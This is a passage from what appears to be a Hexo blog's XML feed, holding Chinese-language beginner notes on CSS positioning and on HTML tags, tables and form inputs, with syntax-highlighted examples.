class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: static;<span class="comment">/*正常定位*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>:fixed;<span class="comment">/*相对于浏览器固定定位*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>:relative;<span class="comment">/*相对其正常位置*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>:absolute;<span class="comment">/*相对于最近的已定位父元素*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: -webkit-sticky; <span class="comment">/*使用sticky定位需使用这个*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: sticky;<span class="comment">/*超出目标区域后固定*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML</title>
      <link href="/2022/09/10/HTML/"/>
      <url>/2022/09/10/HTML/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>声明整个html文档</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span>这是html头</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span>这是html主体</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>这是个一级标题，最小到6级标题</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>这是一个段落</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>这是一个链接</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>在新窗口打开，_self在当前端口打开</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">title</span>=<span class="string">&quot;跳转&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>鼠标悬停提示</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span>&gt;</span> 定向到一张图片</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;1.mp3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span>定向到一个音频</span><br><span class="line">src 要播放音频的地址autoplay 自动播放controls 播放按钮loop 循环播放</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;1.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span>定向到一个视频</span><br><span class="line">src 要播放视频的地址autoplay 自动播放controls 播放按钮loop 循环播放</span><br><span class="line">width、height 窗口的宽、高</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;1.mp4&quot;</span>&gt;</span>定向到音频或视频</span><br><span class="line">src 要播放音频、视频的地址width、height 窗口的宽、高</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span>定义水平线</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>换行</span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span>居中</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;./abc.html&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>内联框架/子窗口</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;地址&quot;</span> <span class="attr">target</span>=<span class="string">&quot;test&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span>加粗</span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>斜体</span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span>字体设置</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>加粗</span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span>定义强调文本，浏览器显示为斜体</span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">sup</span>&gt;</span>上标文本</span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">sub</span>&gt;</span>下标文本</span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">small</span>&gt;</span>缩小文本</span><br><span class="line"><span class="tag">&lt;<span class="name">big</span>&gt;</span><span class="tag">&lt;/<span class="name">big</span>&gt;</span>放大文本</span><br><span class="line"><span class="tag">&lt;<span class="name">bdo</span>&gt;</span><span class="tag">&lt;/<span class="name">bdo</span>&gt;</span>指定文本方向</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span>标签实例</span><br><span class="line"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span>定义键盘文本</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span>定义预格式化的文本</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>无序列表</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>列表项目</span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span><span class="tag">&lt;/<span class="name">ol</span>&gt;</span>有序列表</span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span>定义列表</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span>&gt;</span><span class="tag">&lt;/<span class="name">details</span>&gt;</span>详细信息</span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">summary</span>&gt;</span>为details元素定义一个可见标题</span><br></pre></td></tr></table></figure><h1 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span>声明一个表格</span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>定义表格中的一行</span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span>定义一行中的一个单元格，表示表头单元格,可以实现自动加粗居中效果</span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>定义一行中的一个单元格，表示普通单元格</span><br><span class="line"><span class="tag">&lt;<span class="name">caption</span>&gt;</span><span class="tag">&lt;/<span class="name">caption</span>&gt;</span>定义表格的标题，必须放在<span class="tag">&lt;<span class="name">table</span>&gt;</span>标签之后，只能存在一个</span><br><span class="line"></span><br><span class="line">border:表格中边框的宽度</span><br><span class="line">cellspacing单元格中 边框与边框 的距离单位为像素(px)</span><br><span class="line">cellpadding单元格中 内容与边框 的距离</span><br><span class="line"></span><br><span class="line">align水平对齐：left(向左对齐)、center(居中对齐)、right(向右对齐)</span><br><span class="line">valign垂直对齐：top(向上对齐)、middle(居中对齐)、bottom(向下对齐)</span><br><span class="line"></span><br><span class="line">colspan=&quot;2&quot;横向合并两个单元格</span><br><span class="line">rowspan=&quot;2&quot; 竖向合并两个单元格</span><br><span class="line"></span><br><span class="line">width宽度</span><br><span class="line">height高度单位为像素(px)</span><br></pre></td></tr></table></figure><h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span><span class="tag">&lt;/<span class="name">from</span>&gt;</span>创建表单</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span></span><br><span class="line"></span><br><span class="line">action接收提交的表单</span><br><span class="line">method传参方式</span><br><span class="line">type类型</span><br><span class="line">name说明</span><br><span class="line">value</span><br></pre></td></tr></table></figure><h4 id="type类型："><a href="#type类型：" class="headerlink" title="type类型："></a>type类型：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">text文本</span><br><span class="line">password密码框，内容会被*或者·替代</span><br><span class="line">radio单选框</span><br><span class="line">checkbos多选框</span><br><span class="line">hidden隐藏域</span><br><span class="line">file文件上传</span><br><span class="line">submit提交按钮、还有image、button两种类型可以提交</span><br><span class="line">reset重置按钮</span><br><span class="line"></span><br><span class="line">color选取颜色</span><br><span class="line">number单行输入框只能输入数字</span><br><span class="line">range数值范围的滑块</span><br><span class="line">date点选日期控件</span><br></pre></td></tr></table></figure><h4 id="文本框和密码框"><a href="#文本框和密码框" class="headerlink" title="文本框和密码框"></a>文本框和密码框</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">placeholder提示信息</span><br><span class="line">required必选项目，否则不能提交</span><br><span class="line">autofocus页面打开时，闪烁光标自动出现在这个输入框</span><br><span class="line">maxlength输入字符的最大长度</span><br><span class="line">size输入框的最大长度</span><br><span class="line"></span><br><span class="line">disabled不能输入和修改，表单不会提交此框内容</span><br><span class="line">readonly不能输入和修改</span><br></pre></td></tr></table></figure><h4 id="下拉列表"><a href="#下拉列表" class="headerlink" title="下拉列表"></a>下拉列表</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">城市:</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&#x27;city&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;bj&#x27;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span> <span class="attr">value</span>=<span class="string">&#x27;sh&#x27;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">disabled</span> <span class="attr">value</span>=<span class="string">&#x27;gz&#x27;</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">selected  表示默认被选中</span></span><br><span class="line"><span class="comment">    disabled  你可以看到,但是无法选中它</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">性别: </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;radio&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;sex&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;w&#x27;</span>/&gt;</span> 女</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;radio&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;sex&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;m&#x27;</span> <span class="attr">checked</span> /&gt;</span> 男</span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1) 它们的 name属性值 要一致</span></span><br><span class="line"><span class="comment">    2) checked 表明默认被选中</span></span><br><span class="line"><span class="comment">    3) 点选女的时候, 表单实际上会把 &#x27;w&#x27; 这个字符提交发送</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    默认情况下,点击&#x27;女&#x27;,&#x27;男&#x27;,旁边的单选按钮是不会变化的,</span></span><br><span class="line"><span class="comment">    要实现点文字,单选按钮就被选中的效果,代码可以参考下面:</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  方式一  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--label标签为input元素的文字标注(标记)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;radio&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;sex&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;w&#x27;</span> /&gt;</span> 女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  方式二  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&#x27;one&#x27;</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;radio&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;sex&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;w&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;one&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="多选框"><a href="#多选框" class="headerlink" title="多选框"></a>多选框</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爱好:</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;checkbox&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;hobby[]&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;a&#x27;</span>  <span class="attr">checked</span> /&gt;</span>足球</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;checkbox&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;hobby[]&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;b&#x27;</span> /&gt;</span>排球</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;checkbox&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;hobby[]&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;c&#x27;</span> /&gt;</span>篮球</span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1) 它们的 name 属性值 不能一致, 推荐在名称后面加 [ ]   数组概念以后会讲</span></span><br><span class="line"><span class="comment">    2) checked 表示默认被选中</span></span><br><span class="line"><span class="comment">    3) 选中后提交的时候, 实际提交的是相对应的 value 值</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="隐藏域"><a href="#隐藏域" class="headerlink" title="隐藏域"></a>隐藏域</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span>  <span class="attr">name</span>=<span class="string">&#x27;uid&#x27;</span>  <span class="attr">value</span>=<span class="string">&#x27;17&#x27;</span>    /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span>  <span class="attr">name</span>=<span class="string">&#x27;c&#x27;</span>    <span class="attr">value</span>=<span class="string">&#x27;user&#x27;</span>  /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span>  <span class="attr">name</span>=<span class="string">&#x27;a&#x27;</span>    <span class="attr">value</span>=<span class="string">&#x27;index&#x27;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">它的意思就是, 在页面上根本看不到这些内容, 但是在页面源代码中可以看到.</span></span><br><span class="line"><span class="comment">    目的就是, 没有必要看到的东西,就不让它显示出来</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">action</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;POST&#x27;</span> <span class="attr">enctype</span>=<span class="string">&#x27;multipart/form-data&#x27;</span> &gt;</span></span><br><span class="line">头像:</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;file&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;myface&#x27;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">必须:</span></span><br><span class="line"><span class="comment">    1) 提交方式 method=&#x27;POST&#x27;</span></span><br><span class="line"><span class="comment">    2) 表单中写 ecntype=&#x27;multipart/form-data&#x27;</span></span><br><span class="line"><span class="comment">    3) input 标签中有 name属性值</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&#x27;xxoo&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    多行文本.</span></span><br><span class="line"><span class="comment">一般情况下,两个标签之间应该紧紧挨着, 不能有空格换行之类的.</span></span><br><span class="line"><span class="comment">如果想预先写一些文件放入文本域,应该把要填的内容放到两个标签之间</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;提交&#x27;</span> /&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    1) 点击之后, 有一个把表单数据发送出去的动作</span></span><br><span class="line"><span class="comment">    2) 可以不要 name 属性值, 通常我们只要它有提交数据的动作就可以了</span></span><br><span class="line"><span class="comment">    3) value 值 就是按钮上的文字</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;image&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;./a.jpg&#x27;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    1) 图片按钮, 点击之后有提交表单的动作</span></span><br><span class="line"><span class="comment">    2) src  指定图片的路径位置</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1) 点击之后, 有提交动作</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;提交&#x27;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    1) 普通按钮</span></span><br><span class="line"><span class="comment">    2) 可以通过后期的js代码实现提交动作</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1) 普通按钮</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="数字框"><a href="#数字框" class="headerlink" title="数字框"></a>数字框</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;number&#x27;</span> <span class="attr">step</span>=<span class="string">&#x27;0.1&#x27;</span> <span class="attr">min</span>=<span class="string">&#x27;0&#x27;</span>  <span class="attr">max</span>=<span class="string">&#x27;100&#x27;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   </span></span><br><span class="line"><span class="comment">    1) 输入框中只能敲入数字</span></span><br><span class="line"><span class="comment">    2) step  称为 步进值, 表示每一次增加多少,或减少多少</span></span><br><span class="line"><span class="comment">    3) min   数字框可以输入的最小值</span></span><br><span class="line"><span class="comment">    4) max   数字框可以输入的最大值</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">action</span>=<span class="string">&#x27;./index.php?c=user&amp;a=edit&amp;uid=7&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;GET&#x27;</span>&gt;</span></span><br><span class="line">  ....</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    在 POST 方式下, ? 后面的参数是可以被传递的</span></span><br><span class="line"><span class="comment">    在  GET 方工下, ? 后面的参数 会丢失</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h4><p>表单中除了提交按钮, 其它项目都要有 <code>name属性值</code> , 否则表单不能把它提交出去.</p>]]></content>
      
      
      <categories>
          
          <category> 编程代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog的推送</title>
      <link href="/2022/09/01/Blog/"/>
      <url>/2022/09/01/Blog/</url>
      
